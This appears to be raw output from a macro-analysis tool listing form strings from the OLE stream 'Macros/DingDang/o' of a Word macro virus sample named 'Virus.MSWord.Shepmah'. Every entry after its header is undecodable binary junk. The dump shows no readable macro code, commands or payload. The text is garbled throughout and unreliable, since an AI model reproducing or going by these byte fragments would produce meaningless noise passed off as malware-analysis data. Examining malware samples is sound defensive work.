- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t?��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�T#��Q{:�U!cU�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=ٳC�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���k{���枕�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�jţx��,N�b�ck0D�N&C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�C�4�1 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gc]%�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��vʑ�3DH�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`��`1�C�A��c=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q��

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�j�BNt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`i�F��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(h����>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j+C�)z� s�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w&2��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ɫ>'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`p��t�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{k�{JS\1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<�a�g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 	�����Ҡ`�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��0"v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��c�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ѕ���a��Z��X8�0�d��J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �R��F
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`7�4
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`)+�k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZGH}��(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����QN��-�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)uiH�o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��yl�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ʛ&�"n\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i��J+!�6qT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�t��)��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��� `rGm�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�`���Z�Ő���D���D�dR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�7q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CZy�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�ccs��0�ї
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!`��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0p
��KP�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�d}6�ô�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����w9�!�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�S}�ƏP
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4J9�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K: ��
0�6�D��\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�qБ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�! G��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8e'�L
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ؔ4!>CL
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}��,��zg�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$[�@�Qp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gɲ� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	�1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#/²
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R60�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*��S.Q�>с�2
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǥ"]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(O�XO�`6��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o0nQ%(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$jQ�u�j�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#j�4�]�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�K�z'7�[ynҀ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>#�	J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;Q�ܶ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ߡ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ŗO
'H�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9�q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tqcx�p�Ґum
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0	Q|q-��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0`���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ЏZu��PSxS�߀�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`ޡ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`w�2��[
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0`�Vٙ:�(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P��M
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�qp�*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�5~��xrp�I�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A
�Ё3G~�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�i&�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z�M0�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̳��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����$��n���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
�:/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�'��W��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a��Ja)�1g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�arap��uz�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00K����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1ؕ\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�0�;D1Gº
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a	���`N�)�YA����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PU�(BI(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d��<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	۰)@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y`UHG�(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�P�����p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ws��!��K���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F!�N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@
��I�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`3'�]�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�7b��p	�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/ry8c�9L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[B�n�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����i
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǀ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~pE�~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YrM2œ�N2��ø.)/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����By
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#2Qq-��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@3�Pw%��0B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��&�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4:�篷R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ�EC
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
